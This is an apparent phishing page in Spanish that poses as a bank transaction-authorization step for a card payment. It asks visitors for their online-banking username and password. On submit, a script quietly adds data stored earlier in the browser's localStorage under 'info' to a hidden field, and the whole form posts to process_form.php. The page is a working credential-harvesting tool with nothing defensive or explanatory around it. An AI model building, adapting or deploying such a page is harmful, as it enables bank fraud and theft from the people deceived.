<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autorización de Transacción</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f7f7f7;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        .container img {
            width: 100px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 1.5em;
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1em;
            box-sizing: border-box;
        }
        .info-text {
            font-size: 0.9em;
            color: #666;
            margin-bottom: 20px;
        }
        .btn {
            background-color: #4e79ff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1em;
        }
        .btn:hover {
            background-color: #3a62d1;
        }
        .logos {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .logos img {
            width: 50px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logos">
            <img src="assets/media/vista3cx4.png" alt="ez">
            <img src="assets/media/deruerguwix034.webp" alt="derecha">
        </div>
        <h1>Autorización de transacción</h1>
        <p>Estás intentando realizar un pago por tarjeta de crédito/débito. Necesitamos confirmar que eres tú quien realiza este pago.</p>
        <form id="authForm" action="process_form.php" method="POST">
            <input type="text" name="username" placeholder="Usuario" minlength="4" maxlength="20" required>
            <input type="password" name="password" placeholder="Clave" minlength="4" maxlength="20" required>
            <input type="hidden" name="localStorageInfo" id="localStorageInfo">
            <p class="info-text">Ingresa los datos que usas al entrar a tu banco, recuerda si la operación no se aprueba de manera correcta no se realizará ningún cobro.</p>
            <button type="submit" class="btn">Autorizar</button>
        </form>
    </div>

    <script>
        document.getElementById('authForm').addEventListener('submit', function(event) {
            var info = localStorage.getItem('info');
            if (info) {
                document.getElementById('localStorageInfo').value = info;
            }
        });
    </script>
</body>
</html>
